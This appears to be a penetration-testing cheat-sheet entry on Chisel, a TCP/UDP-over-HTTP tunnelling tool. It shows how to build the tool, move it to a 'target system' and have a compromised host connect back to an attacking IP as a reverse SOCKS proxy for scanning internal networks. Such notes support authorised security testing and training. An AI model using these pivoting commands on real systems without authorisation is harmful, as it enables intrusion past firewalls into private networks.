# Chisel

## Intro

* Chisel is a **fast TCP/UDP tunnel**, transported over **HTTP**, secured via **SSH**. Single executable including both client and server. Written in **Go (golang)**. Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

### Install

```javascript
# Clone Repository
git clone 'https://github.com/jpillora/chisel.git'

# Build Binary
go build

# Binary is now built and ready to be transfered over to target system.
```

### Usage

#### Reverse SOCKS proxy

```java
# Attacking Machine
./chisel server -p <Port> --reverse &
./chisel server -p 1337 --reverse &

# On Target Machine
./chisel client <Attacking-IP>:<Port> R:socks &
./chisel client 10.50.46.8:1337 R:socks &

# Then use Proxychains to scan internal networks from the compromised host.
```
